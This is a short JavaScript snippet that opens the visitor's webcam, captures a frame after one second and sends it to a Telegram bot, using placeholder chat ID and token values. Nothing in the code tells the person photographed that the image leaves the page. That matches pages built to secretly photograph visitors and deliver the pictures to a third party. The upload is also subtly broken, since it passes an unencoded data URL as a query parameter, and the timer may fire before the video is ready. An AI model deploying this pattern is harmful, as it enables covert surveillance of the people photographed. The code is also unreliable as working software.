function capturePhoto() {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const photo = document.getElementById('photo');

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            video.srcObject = stream;
            video.play();
        });

    setTimeout(function() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        photo.src = canvas.toDataURL('image/png');

        // Отправка фото в Telegram
        sendPhotoToTelegram(photo.src);
    }, 1000);
}

function sendPhotoToTelegram(photoUrl) {
    const chatId = 'YOUR_CHAT_ID';
    const token = 'YOUR_BOT_TOKEN';

    fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${photoUrl}`)
        .then(response => {
            console.log(response);
        });
}